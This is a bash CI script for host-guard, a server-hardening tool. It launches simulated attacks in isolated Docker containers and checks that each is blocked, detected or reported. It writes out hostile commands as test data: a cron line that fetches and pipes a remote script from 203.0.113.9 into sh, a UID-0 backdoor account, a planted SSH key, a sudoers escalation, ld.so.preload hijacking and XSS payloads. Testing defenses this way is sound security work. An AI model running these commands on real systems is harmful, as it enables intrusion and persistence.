#!/usr/bin/env bash
# host-guard red-team suite: real attacks against a server protected by host-guard, on an
# isolated Docker network. Each check is PASS (stopped or detected as designed), FAIL (a
# defense did not work: CI fails) or GAP (a known limitation, reported, planned).
#
#   bash ci/redteam/run.sh            results in redteam-out/ (results.jsonl, REPORT.md, mails)
#
# Containers: target (Ubuntu 24.04 with host-guard, sshd, nginx, the panel), floci (emulated S3
# for the off-site backup copies), attacker (SSH brute force), prober (web probes), flooder
# (request flood), auditor (SSH policy checks), admin (the legitimate admin, with the key).
set -uo pipefail
export MSYS_NO_PATHCONV=1
HERE="$(cd "$(dirname "$0")" && pwd)"
REPO="$(cd "$HERE/../.." && pwd)"
OUT="${OUT:-$REPO/redteam-out}"
PY="${PYTHON:-python3}"
IMG=ubuntu:24.04
FLOCI=floci/floci@sha256:a0fbf944d7f338cc0856f1ef83831ea749ff2be71956eb7a7fce08fc21458e19
BROWSER=mcr.microsoft.com/playwright/python@sha256:640d578aae63cfb632461d1b0aecb01414e4e020864ac3dd45a868dc0eff3078   # v1.55.0-noble
ZAPIMG=ghcr.io/zaproxy/zaproxy@sha256:7840969c7c9fead565bf9734b12f49f6886db90b1d35b1f74d79710bbd081dab   # 2.16.1, nightly only (ZAP=1)
DIST="${DIST:-$REPO/dist}"     # the built wheel: the red team attacks exactly what would be published
ls "$DIST"/host_guard-*.whl >/dev/null 2>&1 || { echo "no wheel in $DIST: python3 ci/build_dist.py first"; exit 1; }
NET=hg-redteam
CLIENTS="attacker prober flooder auditor admin"
START=$(date +%s)
mkdir -p "$OUT"
: > "$OUT/results.jsonl"

cleanup() {
  for c in target floci $CLIENTS; do docker rm -f "hgrt-$c" >/dev/null 2>&1; done
  docker network rm "$NET" >/dev/null 2>&1
  docker volume rm hgrt-keys hgrt-mail >/dev/null 2>&1
}
[ "${KEEP:-0}" = 1 ] || trap cleanup EXIT     # KEEP=1 leaves the containers up to look around
cleanup
hp() { if command -v cygpath >/dev/null; then cygpath -m "$1"; else printf '%s' "$1"; fi; }   # paths for Python on Windows

T() { docker exec hgrt-target bash -c "$1"; }
C() { docker exec "hgrt-$1" bash -c "$2"; }
ip_of() { docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' "hgrt-$1"; }
record() {   # id technique attack expected PASS|FAIL|GAP evidence
  ID="$1" TECH="$2" ATTACK="$3" EXPECTED="$4" RESULT="$5" EVIDENCE="$6" "$PY" -c '
import json, os
print(json.dumps({k.lower(): os.environ[k] for k in ("ID", "TECH", "ATTACK", "EXPECTED", "RESULT", "EVIDENCE")}))' >> "$OUT/results.jsonl"
  printf '  %-5s %-9s %s\n' "$5" "$1" "$3"
}
verdict() { if [ "$1" = 1 ]; then echo PASS; else echo "${2:-FAIL}"; fi; }
wait_for() {   # seconds command: true when the command succeeds within the time
  local n="$1"; shift
  for _ in $(seq "$n"); do "$@" >/dev/null 2>&1 && return 0; sleep 1; done
  return 1
}
banned() { T "fail2ban-client status $1 | grep -qw '$2'"; }
mailed() { T "grep -q -- '$1' /var/mail/hg-captured"; }

echo "==> network and containers"
docker network create "$NET" >/dev/null
docker volume create hgrt-keys >/dev/null
docker volume create hgrt-mail >/dev/null      # the admins' inbox: the browser reads its sign-in code there
docker run --rm -v hgrt-keys:/keys "$IMG" bash -c 'apt-get -qq update >/dev/null && apt-get -qq install -y openssh-client >/dev/null 2>&1
  for k in ops intruder root; do ssh-keygen -q -t ed25519 -N "" -C "$k@redteam" -f /keys/$k; done; chmod 644 /keys/*'
docker run -d --name hgrt-floci --network "$NET" --network-alias floci "$FLOCI" >/dev/null
docker run -d --init --name hgrt-target --hostname target --network "$NET" --network-alias target \
  --cap-add NET_ADMIN --cap-add NET_RAW -v "$REPO:/src:ro" -v "$DIST:/dist:ro" -v hgrt-keys:/keys:ro -v hgrt-mail:/var/mail "$IMG" sleep infinity >/dev/null
for c in $CLIENTS; do
  docker run -d --name "hgrt-$c" --network "$NET" -v hgrt-keys:/keys:ro "$IMG" sleep infinity >/dev/null
done
for c in $CLIENTS; do
  C "$c" 'apt-get -qq update >/dev/null && apt-get -qq install -y openssh-client sshpass curl netcat-openbsd >/dev/null 2>&1' &
done
echo "==> target: host-guard installed from the built wheel by its version manager (with the panel)"
if ! T 'bash /src/ci/redteam/target.sh' > "$OUT/target-setup.log" 2>&1; then
  tail -40 "$OUT/target-setup.log"; echo "TARGET SETUP FAILED"; exit 1
fi
wait
for c in $CLIENTS; do
  C "$c" 'mkdir -p ~/.ssh && for k in ops intruder root; do install -m 600 /keys/$k ~/.ssh/$k; done'
done
SSH="ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 -o LogLevel=ERROR"

echo "==> SSH"
out=$(C auditor "sshpass -p Correct-Horse-Battery-9 $SSH -o PubkeyAuthentication=no ops@target true" 2>&1); rc=$?
record SSH-1 T1110.001 "Log in with the right password" "refused: keys only" \
  "$(verdict "$([ $rc != 0 ] && echo 1)")" "exit $rc: ${out:0:120}"
out=$(C auditor "$SSH -i ~/.ssh/root -o BatchMode=yes root@target true" 2>&1); rc=$?
record SSH-2 T1078.003 "Log in as root with root's own valid key" "refused: no root login" \
  "$(verdict "$([ $rc != 0 ] && echo 1)")" "exit $rc: ${out:0:120}"
out=$(C auditor "$SSH -i ~/.ssh/intruder -o BatchMode=yes intruder@target true" 2>&1); rc=$?
record SSH-3 T1078.003 "Log in as a real user with a valid key who is not the admin" "refused: one allowed user" \
  "$(verdict "$([ $rc != 0 ] && echo 1)")" "exit $rc: ${out:0:120}"

AIP=$(ip_of attacker)
t0=$(date +%s)
C attacker "for u in admin oracle postgres ubuntu guest test deploy git; do $SSH -o BatchMode=yes -o PubkeyAuthentication=no \$u@target true; done" >/dev/null 2>&1
if wait_for 60 banned sshd "$AIP"; then
  C attacker 'nc -z -w 4 target 22' >/dev/null 2>&1 && blocked=0 || blocked=1
  record SSH-4 T1110.001 "SSH brute force (8 user names)" "address banned, port 22 closed to it" \
    "$(verdict "$blocked")" "$AIP banned by the sshd jail $(( $(date +%s) - t0 ))s after the first try; port 22 from it: $([ $blocked = 1 ] && echo refused || echo open)"
else
  record SSH-4 T1110.001 "SSH brute force (8 user names)" "address banned, port 22 closed to it" FAIL "not banned within 60s"
fi
out=$(C admin "$SSH -i ~/.ssh/ops -o BatchMode=yes ops@target 'echo logged-in'" 2>&1)
record SSH-5 T1499 "The legitimate admin logs in during the attack" "works (bans are per address)" \
  "$(verdict "$([ "$out" = logged-in ] && echo 1)")" "admin key login: ${out:0:80}"
T 'hostguard health' >/dev/null 2>&1
record SSH-6 T1110 "The admins learn about the ban" "mail with the address and the reason" \
  "$(verdict "$(mailed "$AIP" && mailed 'Blocked' && echo 1)")" "mail: $(T "grep -m1 '^Subject:.*Blocked' /var/mail/hg-captured" 2>/dev/null)"

echo "==> Web"
PIP=$(ip_of prober)
codes=$(C prober 'for p in /.env /.git/config /wp-login.php /phpmyadmin/ /.aws/credentials; do curl -s -o /dev/null -w "%{http_code} " http://target$p; done')
if wait_for 60 banned web-probe "$PIP"; then
  C prober 'curl -s -m 4 -o /dev/null http://target/' && open=1 || open=0
  record WEB-1 T1595.003 "Probe for secrets and admin pages (.env, .git, wp-login, phpMyAdmin, .aws)" \
    "address banned for a day, site closed to it" "$(verdict "$([ $open = 0 ] && echo 1)")" \
    "answers: $codes; $PIP banned by web-probe; site from it: $([ $open = 0 ] && echo refused || echo open)"
else
  record WEB-1 T1595.003 "Probe for secrets and admin pages" "address banned" FAIL "answers: $codes; not banned within 60s"
fi
FIP=$(ip_of flooder)
dist=$(C flooder 'for i in $(seq 150); do curl -s -o /dev/null -w "%{http_code}\n" http://target/; done | sort | uniq -c | tr -s " \n" " "')
if wait_for 60 banned nginx-limit-req "$FIP"; then
  record WEB-2 T1498.001 "Request flood (150 requests as fast as possible)" "rate limit answers 503, then the address is banned" \
    PASS "answers: $dist; $FIP banned by nginx-limit-req"
else
  record WEB-2 T1498.001 "Request flood" "rate limit, then ban" FAIL "answers: $dist; not banned within 60s"
fi
out=$(C admin 'curl -s -o /dev/null -w "%{http_code}" http://target/')
record WEB-3 T1499 "A normal visitor during the attacks" "served" "$(verdict "$([ "$out" = 200 ] && echo 1)")" "HTTP $out"

echo "==> Persistence and privilege on the host (as if an attacker got a root shell)"
T 'useradd -o -u 0 -g 0 -M -N -s /bin/bash sysbackup; hostguard watch' >/dev/null 2>&1
st=$(T "passwd -S sysbackup | cut -d' ' -f2")
record HOST-1 T1136.001 "A second root account (UID 0) named sysbackup" "locked at once, critical mail" \
  "$(verdict "$([ "$st" = L ] && mailed 'Extra root (UID 0) account' && mailed '\[P1 Critical\] Intrusion' && echo 1)")" "account status: $st; critical mail: $(mailed '\[P1 Critical\] Intrusion' && echo yes || echo no)"
T 'userdel -f sysbackup' >/dev/null 2>&1

T 'cp /bin/sleep /tmp/xmrig; (/tmp/xmrig 600 >/dev/null 2>&1 &); sleep 1; hostguard watch' >/dev/null 2>&1
alive=$(T 'for p in $(pgrep -x xmrig); do [ "$(ps -o stat= -p $p | cut -c1)" = Z ] || echo $p; done' 2>/dev/null)
q=$(T 'ls /var/lib/host-guard/quarantine/ | grep -c xmrig' 2>/dev/null)
record HOST-2 T1496 "A crypto miner (xmrig) started from /tmp" "killed, binary quarantined, critical mail" \
  "$(verdict "$([ -z "$alive" ] && [ "$q" -ge 1 ] && mailed 'Suspicious process killed' && echo 1)")" "still running: ${alive:-no}; quarantined copies: $q"

T 'mkdir -p /dev/shm; cp /bin/sleep /dev/shm/updater; (/dev/shm/updater 600 >/dev/null 2>&1 &); sleep 1; hostguard watch' >/dev/null 2>&1
alive=$(T 'for p in $(pgrep -x updater); do [ "$(ps -o stat= -p $p | cut -c1)" = Z ] || echo $p; done' 2>/dev/null)
record HOST-3 T1036.005 "A program with a harmless name running from /dev/shm" "killed (memory-only folder), critical mail" \
  "$(verdict "$([ -z "$alive" ] && echo 1)")" "still running: ${alive:-no}"

T 'cp /bin/sleep /usr/local/bin/kworker-helper; (/usr/local/bin/kworker-helper 600 >/dev/null 2>&1 &); sleep 1; hostguard watch' >/dev/null 2>&1
alive=$(T 'for p in $(pgrep -x kworker-helper); do [ "$(ps -o stat= -p $p | cut -c1)" = Z ] || echo $p; done' 2>/dev/null)
record HOST-4 T1036.004 "A miner renamed like a kernel thread, run from /usr/local/bin" "detected" \
  "$(verdict "$([ -z "$alive" ] && echo 1)" GAP)" "still running: ${alive:-no}. Detection is by name and location; CPU and behaviour anomalies are planned"
T 'pkill -x kworker-helper' >/dev/null 2>&1

T "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBackdoorKeyForRedTeamOnly0000000000000000 attacker@evil' >> /home/ops/.ssh/authorized_keys; hostguard watch" >/dev/null 2>&1
record HOST-5 T1098.004 "An extra SSH key added for the admin user" "alert mail naming the key" \
  "$(verdict "$(mailed 'attacker@evil' && echo 1)")" "mail names the key: $(mailed 'attacker@evil' && echo yes || echo no)"
T "echo 'intruder ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/zz-maint; hostguard watch" >/dev/null 2>&1
record HOST-6 T1548.003 "A sudoers rule giving another user root" "alert mail naming the file" \
  "$(verdict "$(mailed '/etc/sudoers.d/zz-maint' && echo 1)")" "mail names /etc/sudoers.d/zz-maint: $(mailed '/etc/sudoers.d/zz-maint' && echo yes || echo no)"
T "echo '* * * * * root curl -s http://203.0.113.9/x | sh' > /etc/cron.d/sys-update; hostguard watch" >/dev/null 2>&1
record HOST-7 T1053.003 "A cron job that downloads and runs a script" "alert mail naming the file" \
  "$(verdict "$(mailed '/etc/cron.d/sys-update' && echo 1)")" "mail names /etc/cron.d/sys-update: $(mailed '/etc/cron.d/sys-update' && echo yes || echo no)"
T "echo /usr/lib/libsystemd-shim.so > /etc/ld.so.preload; hostguard watch; rm -f /etc/ld.so.preload" >/dev/null 2>&1
record HOST-8 T1574.006 "A library preloaded into every program (/etc/ld.so.preload)" "critical mail" \
  "$(verdict "$(mailed 'ld.so.preload is set' && echo 1)")" "critical mail: $(mailed 'ld.so.preload is set' && echo yes || echo no)"
T 'useradd -m -s /bin/bash support; hostguard watch' >/dev/null 2>&1
record HOST-9 T1136.001 "A new account that can log in (support), after four noisy changes this hour" "alert mail, never held by flood protection" \
  "$(verdict "$(mailed 'New account that can log in: "support"' && echo 1)")" "mail: $(mailed '"support"' && echo yes || echo no)"

echo "==> Network"
C attacker 'nohup nc -lk -p 3333 >/dev/null 2>&1 & nohup nc -lk -p 8443 >/dev/null 2>&1 &' >/dev/null 2>&1
sleep 1
T "nc -z -w 4 $AIP 3333" >/dev/null 2>&1 && pool=open || pool=refused
T "nc -z -w 4 $AIP 8443" >/dev/null 2>&1 && ctl=open || ctl=refused
record NET-1 T1496 "A miner on the server reaches its pool (port 3333)" "outbound refused; other ports work" \
  "$(verdict "$([ $pool = refused ] && [ $ctl = open ] && echo 1)")" "port 3333: $pool; port 8443 (control): $ctl"
SIP=$(ip_of auditor)
C auditor 'for p in 21 23 25 80 110 135 139 143 443 445 993 1433 3306 3389 5432 5900 6379 8080 9200 27017; do nc -z -w 1 target $p; done' >/dev/null 2>&1
T 'hostguard health' >/dev/null 2>&1
mailed 'scan' && scan=1 || scan=0
record NET-2 T1046 "A port scan of 20 common ports" "detected and mailed" "$(verdict "$scan" GAP)" \
  "no scan detection yet (closed ports are not logged); planned with the anomaly release"

echo "==> Backups"
out=$(T 'hostguard backup 2>&1' | tail -2)
key=$(T "python3 -c \"import json;print(json.load(open('/var/lib/host-guard/state.json'))['backup']['name'])\"" 2>/dev/null)
plain=$(T 'grep -l "root:x:0:0" /var/backups/host-guard/* 2>/dev/null | tr "\n" " "')
s3=$(T "python3 /src/ci/redteam/s3tool.py head '$key'" 2>/dev/null)
record BAK-1 T1530 "Read the backups (local disk and the off-site S3 copy)" "encrypted (AES-256), off-site copy present" \
  "$(verdict "$([ -z "$plain" ] && [ "$s3" = 200 ] && echo 1)")" "files with readable /etc/passwd lines: ${plain:-none}; S3 copy of $key: HTTP $s3"
perm=$(T 'stat -c "%a %U" /var/backups/host-guard/* | sort -u | tr "\n" " "')
record BAK-2 T1005 "A local user copies the backup files" "root only (mode 600)" \
  "$(verdict "$([ "$(echo $perm)" = '600 root' ] && echo 1)")" "modes: $perm"
out=$(T 'hostguard restore-test 2>&1' | tail -1)
record BAK-3 T1490 "Is the off-site backup restorable?" "downloaded from S3, decrypted, unpacked" \
  "$(verdict "$(echo "$out" | grep -q 'restore-test: ok' && echo 1)")" "$out"
tampered=$(T "python3 /src/ci/redteam/s3tool.py tamper '$key'" 2>&1)
out=$(T 'hostguard restore-test 2>&1' | tail -1)
record BAK-4 T1565.001 "Ransomware or an insider corrupts the off-site copy" "restore test fails and mails" \
  "$(verdict "$(mailed 'Restore test FAILED' && echo 1)")" "object rewritten (GET, PUT): $tampered; restore test: ${out:0:100}; mail: $(mailed 'Restore test FAILED' && echo yes || echo no)"

echo "==> Secrets"
T 'hostguard export' >/dev/null 2>&1
leaks=$(T 'pp=$(sed -n "s/^BACKUP_PASSPHRASE=//p" /etc/host-guard/.env); for s in "$pp" rt-secret-7f3a9c51e2; do
  grep -rlF -- "$s" /var/lib/host-guard /var/lib/host-guard-export /var/lib/host-guard-panel /var/mail /var/log /opt/host-guard /etc/host-guard/guard.conf /etc/msmtprc 2>/dev/null; done | sort -u | tr "\n" " "')
record SEC-1 T1552.001 "Look for the backup passphrase and the S3 key outside .env (state, export, mails, logs, manifests)" \
  "found nowhere" "$(verdict "$([ -z "$leaks" ] && echo 1)")" "files containing a secret: ${leaks:-none}"
out=$(T 'runuser -u hgpanel -- cat /etc/host-guard/.env 2>&1; runuser -u hgpanel -- ls /var/backups/host-guard 2>&1' | tr '\n' ' ')
record SEC-2 T1552.001 "The panel's account (if the panel were taken over) reads the secrets or the backups" "permission denied" \
  "$(verdict "$(echo "$out" | grep -q 'Permission denied' && ! echo "$out" | grep -q 'BACKUP_PASSPHRASE' && echo 1)")" "${out:0:160}"
perm=$(T 'stat -c "%a %U:%G" /etc/host-guard/.env /etc/host-guard/guard.conf /var/lib/host-guard-export/status.json | tr "\n" " "')
record SEC-3 T1083 "File permissions of secrets, settings and the panel's status file" ".env and guard.conf 600 root; status 640 root:hgpanel" \
  "$(verdict "$([ "$(echo $perm)" = '600 root:root 600 root:root 640 root:hgpanel' ] && echo 1)")" "$perm"

echo "==> Panel in a real browser (headless Chromium in the target's network: what an admin sees through ssh -L)"
# Script in the status data, as a log line or a name an attacker chose could carry it
T "python3 - <<'PYEOF'
import json, time
a = json.load(open('/var/lib/host-guard/alerts.json'))
a['xss-test'] = {'at': time.time(), 'subject': '<img src=x onerror=\"document.title=\\'XSS\\'\">', 'category': 'Host change'}
json.dump(a, open('/var/lib/host-guard/alerts.json', 'w'))
m = json.load(open('/var/lib/host-guard/mail-log.json'))
m['sent'].append({'at': time.time(), 'subject': '<script>document.title=\\'XSS\\'</script>', 'level': 'alert'})
json.dump(m, open('/var/lib/host-guard/mail-log.json', 'w'))
PYEOF
hostguard export >/dev/null"
docker run --rm --network container:hgrt-target -v "$REPO:/src:ro" -v "$OUT:/out" -v hgrt-mail:/mail:ro -e OUT=/out "$BROWSER" \
  sh -c 'pip install -q --no-cache-dir playwright==1.55.0 >/dev/null 2>&1 && python3 /src/ci/redteam/browser_attack.py'   > "$OUT/browser.jsonl" 2>"$OUT/browser.err" || tail -5 "$OUT/browser.err"
grep -q '"GUI-2"' "$OUT/browser.jsonl" || record GUI-0 T1078 "The browser stage ran" "it ran" FAIL "no browser results: $(tail -1 "$OUT/browser.err" | cut -c1-150)"

echo "==> Panel (raw HTTP through the tunnel)"
T 'python3 /src/ci/redteam/panel_attack.py' > "$OUT/panel.jsonl" 2>"$OUT/panel.err"
cat "$OUT/browser.jsonl" >> "$OUT/panel.jsonl"
echo "==> Approvals by mail reply (a real IMAP server on the target)"
T 'timeout 900 python3 /src/ci/redteam/approvals_attack.py' > "$OUT/approvals.jsonl" 2>"$OUT/approvals.err" || tail -5 "$OUT/approvals.err"
grep -q '"MAIL-8"' "$OUT/approvals.jsonl" || record MAIL-X T1078 "The approvals stage ran" "it ran" FAIL "no approvals results: $(tail -1 "$OUT/approvals.err" | cut -c1-150)"
cat "$OUT/approvals.jsonl" >> "$OUT/panel.jsonl"
if [ "${ZAP:-0}" = 1 ]; then
  echo "==> OWASP ZAP baseline of the panel (passive scan, through the tunnel's address)"
  mkdir -p "$OUT/zap" && chmod 777 "$OUT/zap"
  docker run --rm --network container:hgrt-target -v "$OUT/zap:/zap/wrk:rw" "$ZAPIMG"     zap-baseline.py -t http://127.0.0.1:8650/login -I -J zap.json -r zap.html > "$OUT/zap/zap.log" 2>&1
  rc=$?
  sum=$(grep -E '^(FAIL-NEW|WARN-NEW|PASS):' "$OUT/zap/zap.log" | tail -1)
  record WEB-ZAP T1190 "OWASP ZAP baseline scan of the panel (passive rules: headers, cookies, leaks, injection signs)"     "no FAIL" "$(verdict "$([ "$rc" = 0 ] && echo 1)")" "exit $rc; ${sum:-$(tail -1 "$OUT/zap/zap.log" | cut -c1-150)}"
fi
"$PY" - "$(hp "$OUT/panel.jsonl")" "$(hp "$OUT/results.jsonl")" <<'PYEOF'
import json, sys
with open(sys.argv[2], 'a') as out:
    for line in open(sys.argv[1]):
        r = json.loads(line)
        out.write(json.dumps({'id': r['id'], 'tech': r['technique'], 'attack': r['attack'], 'expected': r['expected'],
                              'result': r['result'], 'evidence': r['evidence']}) + '\n')
        print(f"  {r['result']:<5} {r['id']:<9} {r['attack']}")
PYEOF

echo "==> The pip package (supply chain)"
PKGDIR=$(T 'ls -d /opt/pipx/venvs/host-guard/lib/python3*/site-packages/host_guard/payload' 2>/dev/null)
VPY=/opt/pipx/venvs/host-guard/bin/python
out=$(T "cp $PKGDIR/guard/install.sh /root/install.sh.orig; echo 'touch /tmp/pkg-pwned' >> $PKGDIR/guard/install.sh
  host-guard upgrade --yes 2>&1; echo rc=\$?; cp /root/install.sh.orig $PKGDIR/guard/install.sh; ls /tmp/pkg-pwned 2>&1" | tr '\n' ' ')
record PKG-1 T1195.002 "Tamper with the installed package (a command added to its install.sh), then upgrade as root" \
  "refused before anything of it runs" \
  "$(verdict "$(echo "$out" | grep -q 'changed: ' && ! echo "$out" | grep -q 'rc=0' && echo "$out" | grep -q 'No such file' && echo 1)")" "${out:0:220}"
out=$(T "printf 'import os\n' > $PKGDIR/guard/sitecustomize.py; host-guard upgrade --yes 2>&1; echo rc=\$?; rm -f $PKGDIR/guard/sitecustomize.py" | tr '\n' ' ')
record PKG-2 T1195.002 "Plant an extra file in the installed package, then upgrade as root" "refused (the file is not in the package's RECORD)" \
  "$(verdict "$(echo "$out" | grep -q 'added: ' && ! echo "$out" | grep -q 'rc=0' && echo 1)")" "${out:0:220}"
deps=$(T "$VPY -m pip list --format=freeze 2>/dev/null | grep -viE '^(pip|host-guard)==' | tr '\n' ' '")
# a .pth line that starts with "import" runs at every Python start; path lines (pipx's own pipx_shared.pth) do not
pth=$(T "find /opt/pipx/venvs/host-guard -name '*.pth' -exec grep -lE '^[[:space:]]*import[[:space:]]' {} + 2>/dev/null | grep -v '/distutils-precedence.pth$' | tr '\n' ' '")
allpth=$(T "find /opt/pipx/venvs/host-guard -name '*.pth' -printf '%f ' 2>/dev/null")
wsha=$(T 'sha256sum /dist/host_guard-*.whl | cut -c1-16')
record PKG-3 T1195.001 "Dependency confusion or typosquatting through the package's dependencies; code run at every Python start (.pth)" \
  "no dependencies at all; no .pth file that runs code" "$(verdict "$([ -z "${deps// /}" ] && [ -z "${pth// /}" ] && echo 1)")" \
  "other packages in its environment: ${deps:-none}; .pth files that run code: ${pth:-none} (all .pth: ${allpth:-none}, path entries only); wheel attacked: sha256 $wsha..."
ww=$(T 'find /opt/pipx/venvs/host-guard /usr/local/bin/host-guard /opt/host-guard \( -perm -o+w ! -type l \) -o \( ! -user root \) 2>/dev/null | head -5 | tr "\n" " "')
record PKG-4 T1574.010 "A non-root user rewrites the package, the host-guard command or a release (all run as root)" \
  "every file owned by root, none writable by others" "$(verdict "$([ -z "${ww// /}" ] && echo 1)")" "writable or not root's: ${ww:-none}"
out=$(T 'host-guard status 2>&1 | head -3 | tr "\n" " "')
record PKG-5 T1195.002 "After the attacks: the install is still the one from the tested wheel" "status unchanged, upgrade works again" \
  "$(verdict "$(T 'host-guard upgrade --yes >/dev/null 2>&1' && echo 1)")" "${out:0:160}"

echo "==> Mails the admins received"
T 'cat /var/mail/hg-captured' > "$OUT/mails.txt"
T 'grep "^Subject:" /var/mail/hg-captured' | sed 's/^Subject: //' > "$OUT/mail-subjects.txt"
cat "$OUT/mail-subjects.txt"
T 'hostguard report' >/dev/null 2>&1
T 'tail -n +1 /var/mail/hg-captured' | "$PY" "$(hp "$HERE/extract_mail.py")" "Daily report" > "$OUT/sample-daily-report.txt" || true
T 'cat /var/mail/hg-captured' | "$PY" "$(hp "$HERE/extract_mail.py")" "Intrusion signs" > "$OUT/sample-critical-alert.txt" || true

"$PY" "$(hp "$HERE/report.py")" "$(hp "$OUT")" "$(( $(date +%s) - START ))" "$(git -C "$REPO" rev-parse --short HEAD 2>/dev/null || echo unknown)" > "$OUT/REPORT.md"
fails=$(grep -c '"result": "FAIL"' "$OUT/results.jsonl")
echo "==> $(grep -c '"result": "PASS"' "$OUT/results.jsonl") passed, $(grep -c '"result": "GAP"' "$OUT/results.jsonl") known gaps, $fails failed. Report: $OUT/REPORT.md"
[ "$fails" = 0 ]
